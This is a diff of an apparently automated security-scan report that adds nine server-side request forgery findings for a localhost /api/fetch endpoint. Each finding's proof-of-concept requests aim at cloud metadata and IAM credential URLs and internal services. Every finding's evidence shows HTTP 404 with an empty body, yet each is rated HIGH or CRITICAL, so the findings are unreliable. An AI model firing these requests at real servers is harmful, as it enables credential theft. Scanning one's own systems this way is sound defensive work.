@@ -1,7 +1,7 @@
 {
-  "assessment_date": "2026-06-14T13:07:42.390133Z",
+  "assessment_date": "2026-07-06T06:35:29.716584Z",
   "target": "http://localhost:8080",
-  "total": 22,
+  "total": 31,
   "findings": [
     {
       "rule_id": "jwt-alg-none-bypass",
@@ -90,6 +90,132 @@
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "source": "sca"
+    },
+    {
+      "tool": "ssrf_tester",
+      "title": "SSRF via /api/fetch \u2014 localhost API",
+      "severity": "HIGH",
+      "description": "The /api/fetch endpoint fetched internal/cloud URL: http://localhost:8080/actuator/env. This allows attackers to: probe internal services, read cloud metadata (IAM credentials, tokens), and pivot to internal network.",
+      "evidence": "GET /api/fetch?url=http://localhost:8080/actuator/env \u2192 HTTP 404, body_size=0B, inner_status=404, time=0.02s",
+      "poc_steps": [
+        "GET http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "Returns: AWS IAM role, instance ID, security credentials",
+        "GET http://localhost:8080/api/fetch?url=http://localhost:8080/actuator/env",
+        "Returns: all Spring environment variables including secrets"
+      ],
+      "timestamp": "2026-07-06T06:35:25.187970Z"
+    },
+    {
+      "tool": "ssrf_tester",
+      "title": "SSRF via /api/fetch \u2014 localhost H2 Console",
+      "severity": "HIGH",
+      "description": "The /api/fetch endpoint fetched internal/cloud URL: http://localhost:8080/h2-console. This allows attackers to: probe internal services, read cloud metadata (IAM credentials, tokens), and pivot to internal network.",
+      "evidence": "GET /api/fetch?url=http://localhost:8080/h2-console \u2192 HTTP 404, body_size=0B, inner_status=404, time=0.03s",
+      "poc_steps": [
+        "GET http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "Returns: AWS IAM role, instance ID, security credentials",
+        "GET http://localhost:8080/api/fetch?url=http://localhost:8080/actuator/env",
+        "Returns: all Spring environment variables including secrets"
+      ],
+      "timestamp": "2026-07-06T06:35:25.213088Z"
+    },
+    {
+      "tool": "ssrf_tester",
+      "title": "SSRF via /api/fetch \u2014 127.0.0.1 SSH",
+      "severity": "HIGH",
+      "description": "The /api/fetch endpoint fetched internal/cloud URL: http://127.0.0.1:22. This allows attackers to: probe internal services, read cloud metadata (IAM credentials, tokens), and pivot to internal network.",
+      "evidence": "GET /api/fetch?url=http://127.0.0.1:22 \u2192 HTTP 404, body_size=0B, inner_status=404, time=0.03s",
+      "poc_steps": [
+        "GET http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "Returns: AWS IAM role, instance ID, security credentials",
+        "GET http://localhost:8080/api/fetch?url=http://localhost:8080/actuator/env",
+        "Returns: all Spring environment variables including secrets"
+      ],
+      "timestamp": "2026-07-06T06:35:25.243708Z"
+    },
+    {
+      "tool": "ssrf_tester",
+      "title": "SSRF via /api/fetch \u2014 127.0.0.1 Redis",
+      "severity": "HIGH",
+      "description": "The /api/fetch endpoint fetched internal/cloud URL: http://127.0.0.1:6379. This allows attackers to: probe internal services, read cloud metadata (IAM credentials, tokens), and pivot to internal network.",
+      "evidence": "GET /api/fetch?url=http://127.0.0.1:6379 \u2192 HTTP 404, body_size=0B, inner_status=404, time=0.03s",
+      "poc_steps": [
+        "GET http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "Returns: AWS IAM role, instance ID, security credentials",
+        "GET http://localhost:8080/api/fetch?url=http://localhost:8080/actuator/env",
+        "Returns: all Spring environment variables including secrets"
+      ],
+      "timestamp": "2026-07-06T06:35:25.273708Z"
+    },
+    {
+      "tool": "ssrf_tester",
+      "title": "SSRF via /api/fetch \u2014 0.0.0.0",
+      "severity": "HIGH",
+      "description": "The /api/fetch endpoint fetched internal/cloud URL: http://0.0.0.0:8080. This allows attackers to: probe internal services, read cloud metadata (IAM credentials, tokens), and pivot to internal network.",
+      "evidence": "GET /api/fetch?url=http://0.0.0.0:8080 \u2192 HTTP 404, body_size=0B, inner_status=404, time=0.03s",
+      "poc_steps": [
+        "GET http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "Returns: AWS IAM role, instance ID, security credentials",
+        "GET http://localhost:8080/api/fetch?url=http://localhost:8080/actuator/env",
+        "Returns: all Spring environment variables including secrets"
+      ],
+      "timestamp": "2026-07-06T06:35:25.306500Z"
+    },
+    {
+      "tool": "ssrf_tester",
+      "title": "SSRF via /api/fetch \u2014 AWS Metadata",
+      "severity": "CRITICAL",
+      "description": "The /api/fetch endpoint fetched internal/cloud URL: http://169.254.169.254/latest/meta-data/. This allows attackers to: probe internal services, read cloud metadata (IAM credentials, tokens), and pivot to internal network.",
+      "evidence": "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ \u2192 HTTP 404, body_size=0B, inner_status=404, time=0.03s",
+      "poc_steps": [
+        "GET http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "Returns: AWS IAM role, instance ID, security credentials",
+        "GET http://localhost:8080/api/fetch?url=http://localhost:8080/actuator/env",
+        "Returns: all Spring environment variables including secrets"
+      ],
+      "timestamp": "2026-07-06T06:35:25.337674Z"
+    },
+    {
+      "tool": "ssrf_tester",
+      "title": "SSRF via /api/fetch \u2014 AWS IAM Creds",
+      "severity": "CRITICAL",
+      "description": "The /api/fetch endpoint fetched internal/cloud URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/. This allows attackers to: probe internal services, read cloud metadata (IAM credentials, tokens), and pivot to internal network.",
+      "evidence": "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ \u2192 HTTP 404, body_size=0B, inner_status=404, time=0.03s",
+      "poc_steps": [
+        "GET http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "Returns: AWS IAM role, instance ID, security credentials",
+        "GET http://localhost:8080/api/fetch?url=http://localhost:8080/actuator/env",
+        "Returns: all Spring environment variables including secrets"
+      ],
+      "timestamp": "2026-07-06T06:35:25.368663Z"
+    },
+    {
+      "tool": "ssrf_tester",
+      "title": "SSRF via /api/fetch \u2014 GCP Metadata",
+      "severity": "CRITICAL",
+      "description": "The /api/fetch endpoint fetched internal/cloud URL: http://metadata.google.internal/computeMetadata/v1/. This allows attackers to: probe internal services, read cloud metadata (IAM credentials, tokens), and pivot to internal network.",
+      "evidence": "GET /api/fetch?url=http://metadata.google.internal/computeMetadata/v1/ \u2192 HTTP 404, body_size=0B, inner_status=404, time=0.03s",
+      "poc_steps": [
+        "GET http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "Returns: AWS IAM role, instance ID, security credentials",
+        "GET http://localhost:8080/api/fetch?url=http://localhost:8080/actuator/env",
+        "Returns: all Spring environment variables including secrets"
+      ],
+      "timestamp": "2026-07-06T06:35:25.398675Z"
+    },
+    {
+      "tool": "ssrf_tester",
+      "title": "SSRF via /api/fetch \u2014 Azure Metadata",
+      "severity": "CRITICAL",
+      "description": "The /api/fetch endpoint fetched internal/cloud URL: http://169.254.169.254/metadata/instance. This allows attackers to: probe internal services, read cloud metadata (IAM credentials, tokens), and pivot to internal network.",
+      "evidence": "GET /api/fetch?url=http://169.254.169.254/metadata/instance \u2192 HTTP 404, body_size=0B, inner_status=404, time=0.03s",
+      "poc_steps": [
+        "GET http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/",
+        "Returns: AWS IAM role, instance ID, security credentials",
+        "GET http://localhost:8080/api/fetch?url=http://localhost:8080/actuator/env",
+        "Returns: all Spring environment variables including secrets"
+      ],
+      "timestamp": "2026-07-06T06:35:25.428612Z"
     },
     {
       "id": "FIND-001",
